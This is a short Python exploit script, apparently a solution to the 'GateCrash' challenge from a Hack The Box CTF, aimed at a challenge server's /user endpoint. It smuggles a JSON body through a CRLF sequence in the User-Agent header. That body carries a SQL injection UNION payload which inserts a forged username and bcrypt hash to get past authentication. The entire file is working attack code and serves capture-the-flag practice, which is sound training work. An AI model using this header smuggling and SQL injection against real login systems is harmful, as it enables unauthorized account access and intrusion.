#!/usr/bin/env python3
#https://otrashoui.xyz/htb-unictf2023-gatecrash/
import urllib.parse
import json
import requests

#url = "http://localhost:1337/user"
url = "http://94.237.60.154:48354/user"

payload = {
    "Username": "doesntexist' UNION SELECT 42, 'yep', '$2a$10$2VTknsppCsKjWOaUT0sSHeHB5.y0fj/ADxhD6ZRG5PjTeq4MKx0dm",
    "Password": "asdf"
}
payload_str = json.dumps(payload)

user_agent = f"""\
Dragonfly/8.0\x0d\x0a\x0d
{payload_str}\
"""
headers = {"User-Agent": urllib.parse.quote(user_agent)}

dummy_body = {"username": "doesntmatter", "password": "A" * len(payload_str)}
res = requests.post(url, data=dummy_body, headers=headers)
print(res.text)